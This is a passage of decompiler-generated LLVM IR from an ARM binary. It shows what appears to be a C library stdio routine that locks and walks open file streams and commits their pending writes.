dec_label_pc_18724:                               ; preds = %bb, %dec_label_pc_18714
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_18714 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_18728 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 160) to i32*), align 4
  store i32 %v4_18728, i32* %r5.global-to-local, align 4
  %v0_1872c = call i32 @__aeabi_read_tp()
  store i32 %v0_1872c, i32* %r0.global-to-local, align 4
  %v1_18730 = add i32 %v4_18728, 8
  %v2_18730 = inttoptr i32 %v1_18730 to i32*
  %v3_18730 = load i32, i32* %v2_18730, align 4
  store i32 %v3_18730, i32* %r3.global-to-local, align 4
  %v1_18734 = add i32 %v0_1872c, -1168
  store i32 %v1_18734, i32* %r8.global-to-local, align 4
  %v3_18738 = icmp uge i32 %v3_18730, %v1_18734
  store i1 %v3_18738, i1* %cpsr_c.global-to-local, align 1
  %v9_18738 = icmp eq i32 %v3_18730, %v1_18734
  br i1 %v9_18738, label %dec_label_pc_18780, label %dec_label_pc_18740

dec_label_pc_18740:                               ; preds = %dec_label_pc_18724
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_18728, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1874c143 = inttoptr i32 %v4_18728 to i32*
  %v2_1874c144 = load i32, i32* %v1_1874c143, align 4
  store i32 %v2_1874c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_18750146 = icmp eq i32 %v2_1874c144, 0
  br i1 %v9_18750146, label %dec_label_pc_18758, label %dec_label_pc_18770

dec_label_pc_18758:                               ; preds = %dec_label_pc_18740, %dec_label_pc_18758.dec_label_pc_1874c_crit_edge
  %v0_18758147 = phi i32 [ %v1_18750.pre, %dec_label_pc_18758.dec_label_pc_1874c_crit_edge ], [ 0, %dec_label_pc_18740 ]
  store i32 %v0_18758147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18768 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18768, label %dec_label_pc_1876c, label %dec_label_pc_18758.dec_label_pc_1874c_crit_edge

dec_label_pc_18758.dec_label_pc_1874c_crit_edge:  ; preds = %dec_label_pc_18758
  %v0_1874c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18750.pre = load i32, i32* @r4, align 4
  %v1_1874c = inttoptr i32 %v0_1874c.pre to i32*
  %v2_1874c = load i32, i32* %v1_1874c, align 4
  store i32 %v2_1874c, i32* %r3.global-to-local, align 4
  %v3_18750 = icmp uge i32 %v2_1874c, %v1_18750.pre
  store i1 %v3_18750, i1* %cpsr_c.global-to-local, align 1
  %v9_18750 = icmp eq i32 %v2_1874c, %v1_18750.pre
  br i1 %v9_18750, label %dec_label_pc_18758, label %dec_label_pc_18770

dec_label_pc_1876c:                               ; preds = %dec_label_pc_18758
  %v0_1876c = load i32, i32* @r4, align 4
  store i32 %v0_1876c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18770

dec_label_pc_18770:                               ; preds = %dec_label_pc_18740, %dec_label_pc_18758.dec_label_pc_1874c_crit_edge, %dec_label_pc_1876c
  %v0_18770 = phi i32 [ %v0_1876c, %dec_label_pc_1876c ], [ %v2_1874c144, %dec_label_pc_18740 ], [ %v2_1874c, %dec_label_pc_18758.dec_label_pc_1874c_crit_edge ]
  %v1_18770 = phi i32 [ %v0_1876c, %dec_label_pc_1876c ], [ 0, %dec_label_pc_18740 ], [ %v1_18750.pre, %dec_label_pc_18758.dec_label_pc_1874c_crit_edge ]
  %v3_18770 = icmp uge i32 %v0_18770, %v1_18770
  store i1 %v3_18770, i1* %cpsr_c.global-to-local, align 1
  %v9_18770 = icmp eq i32 %v0_18770, %v1_18770
  br i1 %v9_18770, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_18770
  %v1_18774 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_18774, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_18770, %bb65
  %v1_18778 = xor i1 %v9_18770, true
  call void @__pseudo_cond_branch(i1 %v1_18778, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_1877c = load i32, i32* %r8.global-to-local, align 4
  %v1_1877c = load i32, i32* %r5.global-to-local, align 4
  %v2_1877c = add i32 %v1_1877c, 8
  %v3_1877c = inttoptr i32 %v2_1877c to i32*
  store i32 %v0_1877c, i32* %v3_1877c, align 4
  br label %dec_label_pc_18780

dec_label_pc_18780:                               ; preds = %dec_label_pc_18724, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_18784 = load i32, i32* @r6, align 4
  %v2_18784 = add i32 %v0_18784, 160
  %v3_18784 = inttoptr i32 %v2_18784 to i32*
  %v4_18784 = load i32, i32* %v3_18784, align 4
  store i32 %v4_18784, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1878c = add i32 %v0_18784, 12
  %v3_1878c = inttoptr i32 %v2_1878c to i32*
  %v4_1878c = load i32, i32* %v3_1878c, align 4
  store i32 %v4_1878c, i32* %r2.global-to-local, align 4
  %v1_18790 = add i32 %v4_18784, 4
  %v2_18790 = inttoptr i32 %v1_18790 to i32*
  %v3_18790 = load i32, i32* %v2_18790, align 4
  store i32 %v3_18790, i32* %r1.global-to-local, align 4
  %v1_18794 = inttoptr i32 %v4_1878c to i32*
  %v2_18794 = load i32, i32* %v1_18794, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18798 = icmp eq i32 %v3_18790, 0
  %v1_1879c = add i32 %v2_18794, 1
  store i32 %v1_1879c, i32* %r3.global-to-local, align 4
  store i32 %v1_1879c, i32* %v1_18794, align 4
  br i1 %v2_18798, label %dec_label_pc_187a8, label %dec_label_pc_18808

dec_label_pc_187a8:                               ; preds = %dec_label_pc_18780
  %v0_187a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_187a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_187a8 = add i32 %v1_187a8, 8
  %v3_187a8 = inttoptr i32 %v2_187a8 to i32*
  store i32 %v0_187a8, i32* %v3_187a8, align 4
  %v0_187ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_187ac, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_187b0

dec_label_pc_187b0:                               ; preds = %dec_label_pc_187e0.dec_label_pc_187b0_crit_edge, %dec_label_pc_187a8
  %v0_187b0 = phi i32 [ %v0_187b0.pre, %dec_label_pc_187e0.dec_label_pc_187b0_crit_edge ], [ %v0_187ac, %dec_label_pc_187a8 ]
  %v1_187b0 = inttoptr i32 %v0_187b0 to i32*
  %v2_187b0 = load i32, i32* %v1_187b0, align 4
  store i32 %v2_187b0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_187b0, i32* %r2.global-to-local, align 4
  %v2_187bc131 = load i32, i32* %v1_187b0, align 4
  store i32 %v2_187bc131, i32* %r3.global-to-local, align 4
  %v3_187c0133 = icmp uge i32 %v2_187bc131, %v2_187b0
  store i1 %v3_187c0133, i1* %cpsr_c.global-to-local, align 1
  %v9_187c0139 = icmp eq i32 %v2_187bc131, %v2_187b0
  br i1 %v9_187c0139, label %dec_label_pc_187c8, label %dec_label_pc_187e0

dec_label_pc_187c8:                               ; preds = %dec_label_pc_187b0, %dec_label_pc_187c8.dec_label_pc_187bc_crit_edge
  %v0_187c8140 = phi i32 [ %v1_187c0.pre, %dec_label_pc_187c8.dec_label_pc_187bc_crit_edge ], [ %v2_187b0, %dec_label_pc_187b0 ]
  store i32 %v0_187c8140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_187d8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_187d8, label %dec_label_pc_187dc, label %dec_label_pc_187c8.dec_label_pc_187bc_crit_edge

dec_label_pc_187c8.dec_label_pc_187bc_crit_edge:  ; preds = %dec_label_pc_187c8
  %v0_187bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_187c0.pre = load i32, i32* @r4, align 4
  %v1_187bc = inttoptr i32 %v0_187bc.pre to i32*
  %v2_187bc = load i32, i32* %v1_187bc, align 4
  store i32 %v2_187bc, i32* %r3.global-to-local, align 4
  %v3_187c0 = icmp uge i32 %v2_187bc, %v1_187c0.pre
  store i1 %v3_187c0, i1* %cpsr_c.global-to-local, align 1
  %v9_187c0 = icmp eq i32 %v2_187bc, %v1_187c0.pre
  br i1 %v9_187c0, label %dec_label_pc_187c8, label %dec_label_pc_187e0

dec_label_pc_187dc:                               ; preds = %dec_label_pc_187c8
  %v0_187dc = load i32, i32* @r4, align 4
  store i32 %v0_187dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_187e0

dec_label_pc_187e0:                               ; preds = %dec_label_pc_187b0, %dec_label_pc_187c8.dec_label_pc_187bc_crit_edge, %dec_label_pc_187dc
  %v0_187e8 = phi i32 [ %v0_187dc, %dec_label_pc_187dc ], [ %v2_187bc131, %dec_label_pc_187b0 ], [ %v2_187bc, %dec_label_pc_187c8.dec_label_pc_187bc_crit_edge ]
  %v1_187e0 = phi i32 [ %v0_187dc, %dec_label_pc_187dc ], [ %v2_187b0, %dec_label_pc_187b0 ], [ %v1_187c0.pre, %dec_label_pc_187c8.dec_label_pc_187bc_crit_edge ]
  %v3_187e0 = icmp uge i32 %v0_187e8, %v1_187e0
  store i1 %v3_187e0, i1* %cpsr_c.global-to-local, align 1
  %v9_187e0 = icmp eq i32 %v0_187e8, %v1_187e0
  br i1 %v9_187e0, label %dec_label_pc_187e8, label %dec_label_pc_187e0.dec_label_pc_187b0_crit_edge

dec_label_pc_187e0.dec_label_pc_187b0_crit_edge:  ; preds = %dec_label_pc_187e0
  %v0_187b0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_187b0

dec_label_pc_187e8:                               ; preds = %dec_label_pc_187e0
  %v2_187e8 = icmp ne i32 %v1_187e0, 0
  store i1 %v2_187e8, i1* %cpsr_c.global-to-local, align 1
  %v7_187ec = icmp slt i32 %v1_187e0, 2
  br i1 %v7_187ec, label %dec_label_pc_18808, label %dec_label_pc_187f0

dec_label_pc_187f0:                               ; preds = %dec_label_pc_187e8
  %v0_187f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_187f0, i32* %r0.global-to-local, align 4
  %v0_187f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_187f4 = add i32 %v0_187f4, 129
  store i32 %v1_187f4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18808

dec_label_pc_18808:                               ; preds = %dec_label_pc_18780, %dec_label_pc_187f0, %dec_label_pc_187e8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_1880c = load i32, i32* @r6, align 4
  %v2_1880c = add i32 %v0_1880c, 152
  %v3_1880c = inttoptr i32 %v2_1880c to i32*
  %v4_1880c = load i32, i32* %v3_1880c, align 4
  store i32 %v4_1880c, i32* %r5.global-to-local, align 4
  %v1_18810 = add i32 %v4_1880c, 8
  %v2_18810 = inttoptr i32 %v1_18810 to i32*
  %v3_18810 = load i32, i32* %v2_18810, align 4
  store i32 %v3_18810, i32* %r3.global-to-local, align 4
  %v1_18814 = load i32, i32* %r8.global-to-local, align 4
  %v3_18814 = icmp uge i32 %v3_18810, %v1_18814
  store i1 %v3_18814, i1* %cpsr_c.global-to-local, align 1
  %v9_18814 = icmp eq i32 %v3_18810, %v1_18814
  br i1 %v9_18814, label %dec_label_pc_1885c, label %dec_label_pc_1881c

dec_label_pc_1881c:                               ; preds = %dec_label_pc_18808
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_1880c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_18828123 = inttoptr i32 %v4_1880c to i32*
  %v2_18828124 = load i32, i32* %v1_18828123, align 4
  store i32 %v2_18828124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1882c126 = icmp eq i32 %v2_18828124, 0
  br i1 %v9_1882c126, label %dec_label_pc_18834, label %dec_label_pc_1884c

dec_label_pc_18834:                               ; preds = %dec_label_pc_1881c, %dec_label_pc_18834.dec_label_pc_18828_crit_edge
  %v0_18834127 = phi i32 [ %v1_1882c.pre, %dec_label_pc_18834.dec_label_pc_18828_crit_edge ], [ 0, %dec_label_pc_1881c ]
  store i32 %v0_18834127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18844 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18844, label %dec_label_pc_18848, label %dec_label_pc_18834.dec_label_pc_18828_crit_edge

dec_label_pc_18834.dec_label_pc_18828_crit_edge:  ; preds = %dec_label_pc_18834
  %v0_18828.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1882c.pre = load i32, i32* @r4, align 4
  %v1_18828 = inttoptr i32 %v0_18828.pre to i32*
  %v2_18828 = load i32, i32* %v1_18828, align 4
  store i32 %v2_18828, i32* %r3.global-to-local, align 4
  %v3_1882c = icmp uge i32 %v2_18828, %v1_1882c.pre
  store i1 %v3_1882c, i1* %cpsr_c.global-to-local, align 1
  %v9_1882c = icmp eq i32 %v2_18828, %v1_1882c.pre
  br i1 %v9_1882c, label %dec_label_pc_18834, label %dec_label_pc_1884c

dec_label_pc_18848:                               ; preds = %dec_label_pc_18834
  %v0_18848 = load i32, i32* @r4, align 4
  store i32 %v0_18848, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1884c

dec_label_pc_1884c:                               ; preds = %dec_label_pc_1881c, %dec_label_pc_18834.dec_label_pc_18828_crit_edge, %dec_label_pc_18848
  %v0_1884c = phi i32 [ %v0_18848, %dec_label_pc_18848 ], [ %v2_18828124, %dec_label_pc_1881c ], [ %v2_18828, %dec_label_pc_18834.dec_label_pc_18828_crit_edge ]
  %v1_1884c = phi i32 [ %v0_18848, %dec_label_pc_18848 ], [ 0, %dec_label_pc_1881c ], [ %v1_1882c.pre, %dec_label_pc_18834.dec_label_pc_18828_crit_edge ]
  %v3_1884c = icmp uge i32 %v0_1884c, %v1_1884c
  store i1 %v3_1884c, i1* %cpsr_c.global-to-local, align 1
  %v9_1884c = icmp eq i32 %v0_1884c, %v1_1884c
  br i1 %v9_1884c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_1884c
  %v1_18850 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_18850, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_1884c, %bb67
  %v1_18854 = xor i1 %v9_1884c, true
  call void @__pseudo_cond_branch(i1 %v1_18854, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_18858 = load i32, i32* %r8.global-to-local, align 4
  %v1_18858 = load i32, i32* %r5.global-to-local, align 4
  %v2_18858 = add i32 %v1_18858, 8
  %v3_18858 = inttoptr i32 %v2_18858 to i32*
  store i32 %v0_18858, i32* %v3_18858, align 4
  %v0_18860.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1885c

dec_label_pc_1885c:                               ; preds = %dec_label_pc_18808, %bb68
  %v0_1886c = phi i32 [ %v0_1880c, %dec_label_pc_18808 ], [ %v0_18860.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_18860 = add i32 %v0_1886c, 152
  %v3_18860 = inttoptr i32 %v2_18860 to i32*
  %v4_18860 = load i32, i32* %v3_18860, align 4
  store i32 %v4_18860, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_18868 = add i32 %v4_18860, 4
  %v2_18868 = inttoptr i32 %v1_18868 to i32*
  %v3_18868 = load i32, i32* %v2_18868, align 4
  store i32 %v3_18868, i32* %r1.global-to-local, align 4
  %v2_1886c = add i32 %v0_1886c, 76
  %v3_1886c = inttoptr i32 %v2_1886c to i32*
  %v4_1886c = load i32, i32* %v3_1886c, align 4
  store i32 %v4_1886c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18870 = icmp eq i32 %v3_18868, 0
  %v1_18874 = inttoptr i32 %v4_1886c to i32*
  %v2_18874 = load i32, i32* %v1_18874, align 4
  store i32 %v2_18874, i32* @r5, align 4
  br i1 %v2_18870, label %dec_label_pc_1887c, label %dec_label_pc_188dc

dec_label_pc_1887c:                               ; preds = %dec_label_pc_1885c
  %v2_1887c = add i32 %v4_18860, 8
  %v3_1887c = inttoptr i32 %v2_1887c to i32*
  store i32 0, i32* %v3_1887c, align 4
  %v0_18880 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18880, i32* @r7, align 4
  br label %dec_label_pc_18884

dec_label_pc_18884:                               ; preds = %dec_label_pc_188b4.dec_label_pc_18884_crit_edge, %dec_label_pc_1887c
  %v0_18884 = phi i32 [ %v0_18884.pre, %dec_label_pc_188b4.dec_label_pc_18884_crit_edge ], [ %v0_18880, %dec_label_pc_1887c ]
  %v1_18884 = inttoptr i32 %v0_18884 to i32*
  %v2_18884 = load i32, i32* %v1_18884, align 4
  store i32 %v2_18884, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_18884, i32* %r2.global-to-local, align 4
  %v2_18890111 = load i32, i32* %v1_18884, align 4
  store i32 %v2_18890111, i32* %r3.global-to-local, align 4
  %v3_18894113 = icmp uge i32 %v2_18890111, %v2_18884
  store i1 %v3_18894113, i1* %cpsr_c.global-to-local, align 1
  %v9_18894119 = icmp eq i32 %v2_18890111, %v2_18884
  br i1 %v9_18894119, label %dec_label_pc_1889c, label %dec_label_pc_188b4

dec_label_pc_1889c:                               ; preds = %dec_label_pc_18884, %dec_label_pc_1889c.dec_label_pc_18890_crit_edge
  %v0_1889c120 = phi i32 [ %v1_18894.pre, %dec_label_pc_1889c.dec_label_pc_18890_crit_edge ], [ %v2_18884, %dec_label_pc_18884 ]
  store i32 %v0_1889c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_188ac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_188ac, label %dec_label_pc_188b0, label %dec_label_pc_1889c.dec_label_pc_18890_crit_edge

dec_label_pc_1889c.dec_label_pc_18890_crit_edge:  ; preds = %dec_label_pc_1889c
  %v0_18890.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18894.pre = load i32, i32* @r4, align 4
  %v1_18890 = inttoptr i32 %v0_18890.pre to i32*
  %v2_18890 = load i32, i32* %v1_18890, align 4
  store i32 %v2_18890, i32* %r3.global-to-local, align 4
  %v3_18894 = icmp uge i32 %v2_18890, %v1_18894.pre
  store i1 %v3_18894, i1* %cpsr_c.global-to-local, align 1
  %v9_18894 = icmp eq i32 %v2_18890, %v1_18894.pre
  br i1 %v9_18894, label %dec_label_pc_1889c, label %dec_label_pc_188b4

dec_label_pc_188b0:                               ; preds = %dec_label_pc_1889c
  %v0_188b0 = load i32, i32* @r4, align 4
  store i32 %v0_188b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_188b4

dec_label_pc_188b4:                               ; preds = %dec_label_pc_18884, %dec_label_pc_1889c.dec_label_pc_18890_crit_edge, %dec_label_pc_188b0
  %v0_188bc = phi i32 [ %v0_188b0, %dec_label_pc_188b0 ], [ %v2_18890111, %dec_label_pc_18884 ], [ %v2_18890, %dec_label_pc_1889c.dec_label_pc_18890_crit_edge ]
  %v1_188b4 = phi i32 [ %v0_188b0, %dec_label_pc_188b0 ], [ %v2_18884, %dec_label_pc_18884 ], [ %v1_18894.pre, %dec_label_pc_1889c.dec_label_pc_18890_crit_edge ]
  %v3_188b4 = icmp uge i32 %v0_188bc, %v1_188b4
  store i1 %v3_188b4, i1* %cpsr_c.global-to-local, align 1
  %v9_188b4 = icmp eq i32 %v0_188bc, %v1_188b4
  br i1 %v9_188b4, label %dec_label_pc_188bc, label %dec_label_pc_188b4.dec_label_pc_18884_crit_edge

dec_label_pc_188b4.dec_label_pc_18884_crit_edge:  ; preds = %dec_label_pc_188b4
  %v0_18884.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18884

dec_label_pc_188bc:                               ; preds = %dec_label_pc_188b4
  %v2_188bc = icmp ne i32 %v1_188b4, 0
  store i1 %v2_188bc, i1* %cpsr_c.global-to-local, align 1
  %v7_188c0 = icmp slt i32 %v1_188b4, 2
  br i1 %v7_188c0, label %dec_label_pc_188dcthread-pre-split, label %dec_label_pc_188c4

dec_label_pc_188c4:                               ; preds = %dec_label_pc_188bc
  %v0_188c4 = load i32, i32* @r7, align 4
  store i32 %v0_188c4, i32* %r0.global-to-local, align 4
  %v0_188c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_188c8 = add i32 %v0_188c8, 129
  store i32 %v1_188c8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_188dcthread-pre-split

dec_label_pc_188dcthread-pre-split:               ; preds = %dec_label_pc_188bc, %dec_label_pc_188c4
  %v0_18a28.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_188dc

dec_label_pc_188dc:                               ; preds = %dec_label_pc_188dcthread-pre-split, %dec_label_pc_1885c
  %v0_18a28.pr = phi i32 [ %v0_18a28.pr.pr, %dec_label_pc_188dcthread-pre-split ], [ %v2_18874, %dec_label_pc_1885c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18a2818 = icmp eq i32 %v0_18a28.pr, 0
  br i1 %v2_18a2818, label %dec_label_pc_18a30, label %dec_label_pc_188ec

dec_label_pc_188ec:                               ; preds = %dec_label_pc_188dc, %dec_label_pc_18a24
  %v0_18914 = phi i32 [ %v3_18a24, %dec_label_pc_18a24 ], [ %v0_18a28.pr, %dec_label_pc_188dc ]
  %v1_188ec = inttoptr i32 %v0_18914 to i16*
  %v2_188ec = load i16, i16* %v1_188ec, align 2
  %v3_188ec = zext i16 %v2_188ec to i32
  store i32 %v3_188ec, i32* %r3.global-to-local, align 4
  %v1_188f0 = and i32 %v3_188ec, 64
  %v2_188f0 = icmp eq i32 %v1_188f0, 0
  br i1 %v2_188f0, label %dec_label_pc_18a24, label %dec_label_pc_188f8

dec_label_pc_188f8:                               ; preds = %dec_label_pc_188ec
  %v0_188f8 = load i32, i32* @r6, align 4
  %v1_188f8 = load i32, i32* %sb.global-to-local, align 4
  %v2_188f8 = add i32 %v1_188f8, %v0_188f8
  %v3_188f8 = inttoptr i32 %v2_188f8 to i32*
  %v4_188f8 = load i32, i32* %v3_188f8, align 4
  store i32 %v4_188f8, i32* %r3.global-to-local, align 4
  %v1_188fc = inttoptr i32 %v4_188f8 to i32*
  %v2_188fc = load i32, i32* %v1_188fc, align 4
  store i32 %v2_188fc, i32* %r3.global-to-local, align 4
  %v2_18900 = icmp ugt i32 %v2_188fc, 1
  store i1 %v2_18900, i1* %cpsr_c.global-to-local, align 1
  %v7_18900 = icmp eq i32 %v2_188fc, 2
  br i1 %v7_18900, label %dec_label_pc_18964, label %dec_label_pc_18908

dec_label_pc_18908:                               ; preds = %dec_label_pc_188f8
  %v1_18908 = add i32 %v0_18914, 64
  %v2_18908 = inttoptr i32 %v1_18908 to i32*
  %v3_18908 = load i32, i32* %v2_18908, align 4
  store i32 %v3_18908, i32* %r3.global-to-local, align 4
  %v1_1890c = load i32, i32* %r8.global-to-local, align 4
  %v3_1890c = icmp uge i32 %v3_18908, %v1_1890c
  store i1 %v3_1890c, i1* %cpsr_c.global-to-local, align 1
  %v9_1890c = icmp eq i32 %v3_18908, %v1_1890c
  br i1 %v9_1890c, label %dec_label_pc_18958, label %dec_label_pc_18914

dec_label_pc_18914:                               ; preds = %dec_label_pc_18908
  %v1_18914 = add i32 %v0_18914, 56
  store i32 %v1_18914, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_18914, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1892486 = inttoptr i32 %v1_18914 to i32*
  %v2_1892487 = load i32, i32* %v1_1892486, align 4
  store i32 %v2_1892487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1892894 = icmp eq i32 %v2_1892487, 0
  br i1 %v9_1892894, label %dec_label_pc_18930, label %dec_label_pc_18948

dec_label_pc_18930:                               ; preds = %dec_label_pc_18914, %dec_label_pc_18930.dec_label_pc_18924_crit_edge
  %v0_1893095 = phi i32 [ %v1_18928.pre, %dec_label_pc_18930.dec_label_pc_18924_crit_edge ], [ 0, %dec_label_pc_18914 ]
  store i32 %v0_1893095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18940 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18940, label %dec_label_pc_18944, label %dec_label_pc_18930.dec_label_pc_18924_crit_edge

dec_label_pc_18930.dec_label_pc_18924_crit_edge:  ; preds = %dec_label_pc_18930
  %v0_18924.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18928.pre = load i32, i32* @r4, align 4
  %v1_18924 = inttoptr i32 %v0_18924.pre to i32*
  %v2_18924 = load i32, i32* %v1_18924, align 4
  store i32 %v2_18924, i32* %r3.global-to-local, align 4
  %v3_18928 = icmp uge i32 %v2_18924, %v1_18928.pre
  store i1 %v3_18928, i1* %cpsr_c.global-to-local, align 1
  %v9_18928 = icmp eq i32 %v2_18924, %v1_18928.pre
  br i1 %v9_18928, label %dec_label_pc_18930, label %dec_label_pc_18948

dec_label_pc_18944:                               ; preds = %dec_label_pc_18930
  %v0_18944 = load i32, i32* @r4, align 4
  store i32 %v0_18944, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18948

dec_label_pc_18948:                               ; preds = %dec_label_pc_18914, %dec_label_pc_18930.dec_label_pc_18924_crit_edge, %dec_label_pc_18944
  %v0_18948 = phi i32 [ %v0_18944, %dec_label_pc_18944 ], [ %v2_1892487, %dec_label_pc_18914 ], [ %v2_18924, %dec_label_pc_18930.dec_label_pc_18924_crit_edge ]
  %v1_18948 = phi i32 [ %v0_18944, %dec_label_pc_18944 ], [ 0, %dec_label_pc_18914 ], [ %v1_18928.pre, %dec_label_pc_18930.dec_label_pc_18924_crit_edge ]
  %v3_18948 = icmp uge i32 %v0_18948, %v1_18948
  store i1 %v3_18948, i1* %cpsr_c.global-to-local, align 1
  %v9_18948 = icmp eq i32 %v0_18948, %v1_18948
  br i1 %v9_18948, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_18948
  %v1_1894c = load i32, i32* @r7, align 4
  store i32 %v1_1894c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_18948, %bb69
  %v1_18950 = xor i1 %v9_18948, true
  call void @__pseudo_cond_branch(i1 %v1_18950, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_18954 = load i32, i32* %r8.global-to-local, align 4
  %v1_18954 = load i32, i32* @r5, align 4
  %v2_18954 = add i32 %v1_18954, 64
  %v3_18954 = inttoptr i32 %v2_18954 to i32*
  store i32 %v0_18954, i32* %v3_18954, align 4
  %v0_18958.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18958

dec_label_pc_18958:                               ; preds = %dec_label_pc_18908, %bb70
  %v0_18958 = phi i32 [ %v0_18914, %dec_label_pc_18908 ], [ %v0_18958.pre, %bb70 ]
  %v1_18958 = add i32 %v0_18958, 60
  %v2_18958 = inttoptr i32 %v1_18958 to i32*
  %v3_18958 = load i32, i32* %v2_18958, align 4
  %v1_1895c = add i32 %v3_18958, 1
  store i32 %v1_1895c, i32* %r3.global-to-local, align 4
  store i32 %v1_1895c, i32* %v2_18958, align 4
  %v0_18964.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18964

dec_label_pc_18964:                               ; preds = %dec_label_pc_188f8, %dec_label_pc_18958
  %v0_1897c = phi i32 [ %v0_18914, %dec_label_pc_188f8 ], [ %v0_18964.pre, %dec_label_pc_18958 ]
  %v1_18964 = inttoptr i32 %v0_1897c to i16*
  %v2_18964 = load i16, i16* %v1_18964, align 2
  %v3_18964 = zext i16 %v2_18964 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_1896c = or i32 %v3_18964, %stack_var_-44.1
  %v1_18970 = xor i32 %v2_1896c, 320
  store i32 %v1_18970, i32* %r3.global-to-local, align 4
  %v1_18974 = and i32 %v1_18970, 832
  %v2_18974 = icmp eq i32 %v1_18974, 0
  br i1 %v2_18974, label %dec_label_pc_1897c, label %bb71

dec_label_pc_1897c:                               ; preds = %dec_label_pc_18964
  store i32 %v0_1897c, i32* %r0.global-to-local, align 4
  %v1_18980 = call i32 @__stdio_wcommit(i32 %v0_1897c)
  store i32 %v1_18980, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18984 = icmp eq i32 %v1_18980, 0
  br i1 %v2_18984, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_1897c
  %v1_18988 = load i32, i32* @r5, align 4
